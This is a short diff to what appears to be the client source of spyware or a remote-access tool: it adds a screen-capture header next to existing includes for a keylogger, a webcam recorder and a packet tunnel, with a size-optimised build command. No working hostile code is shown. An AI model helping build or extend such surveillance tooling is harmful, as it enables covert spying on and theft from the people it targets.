@@ -15,6 +15,7 @@
 #include "client_macros.hpp"
 #include "clkeylogger.hpp"
 #include "clwebcam_recorder.hpp"
+#include "clscreen_hunter.hpp"
 #include "clpacket_tunnel.hpp"
 
 // g++ client.cpp -o client -Os -s
